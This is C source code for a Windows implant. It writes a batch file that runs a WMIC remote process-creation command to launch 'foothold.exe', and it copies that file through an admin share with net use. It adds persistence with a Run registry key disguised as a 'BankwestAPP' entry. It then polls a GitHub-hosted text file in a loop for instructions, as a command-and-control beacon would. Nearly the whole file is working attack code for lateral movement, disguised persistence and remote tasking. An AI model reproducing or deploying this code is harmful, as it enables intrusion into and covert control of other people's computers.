#include <stdio.h>
#include <windows.h>
#include <fileapi.h>
#include <wininet.h>
#include <stdint.h>
#include <winnt.h>
#include <unistd.h>



int main()
{
	const char* dirpath = "c:\\Users\\saurav\\Temp";
	const char* filename = "c:\\Users\\saurav\\Temp\\evil.bat";
    	const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'\\\\SauravWindowsVi\\c$\\Users\\saurav\\Desktop\\foothold.exe\'";


//Create Directory
	BOOL bDir;
	bDir = CreateDirectoryA(dirpath, NULL);
	//char* URL = "https://github.com/lacouls/C/blob/main/textblob";

//Create a File
	HANDLE hfile;
	hfile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hfile == INVALID_HANDLE_VALUE)
	{
		printf("File creation failed\n");
		return 1;
	}
	
//Write to file
    BOOL WrFile;
    long unsigned int byteswritten;
    WrFile = WriteFile(hfile, filecontent, strlen(filecontent), &byteswritten, NULL);

    CloseHandle(hfile);

//Create computer.txt content
	system("echo SauravWindowsVi > c:\\Users\\saurav\\Temp\\computer.txt");
	system("net use F: \\\\\sauravwindowsVi\\C$\\users\\saurav\\Desktop /user:saurav");
	system("copy c:\\users\\saurav\\Desktop\\foothold.exe f:");
    
//Set registry runkey Value - point to bankwestapp.exe

	HKEY hkey;
	LPCSTR set_string_value = "c:\\Users\\Public\\Temp\\foothold.exe";
	//const char set_string_value [] = {'b','a','n','k','w','e','s','t','\0'};
	//char* subkeyname = "Bankwest App";

	RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey); //open registry key handle.
	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
	RegCloseKey(hkey);

//Create a schtask - to run the filecontent.

//Create a persistent windows service. 

//Check for instruction
	HINTERNET hInternet, hConnect, hRequest;
    	BOOL bResult;
    	DWORD dwBytesRead;
    	char buffer[4096];
	int i;
	
	for (i = 0; i < 10; i++)
	{
		// Initialize WinINet
		hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	  
		// Connect to the server
		hConnect = InternetConnectA(hInternet, "raw.githubusercontent.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	  

		// Create an HTTP GET request
		hRequest = HttpOpenRequestA(hConnect, "GET", "/lacouls/Public_download/refs/heads/main/checker.txt", NULL, NULL, NULL, 0, 0);
	   

		// Send the request
		bResult = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);


		// Read the response
		do {
			bResult = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &dwBytesRead);
			if (bResult && dwBytesRead > 0) {
				buffer[dwBytesRead] = '\0'; // Null-terminate the buffer
				printf("%s", buffer);
			}
		} while (bResult && dwBytesRead > 0);
		Sleep(3000);
		// Clean up
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		
	}
	return 0;
}
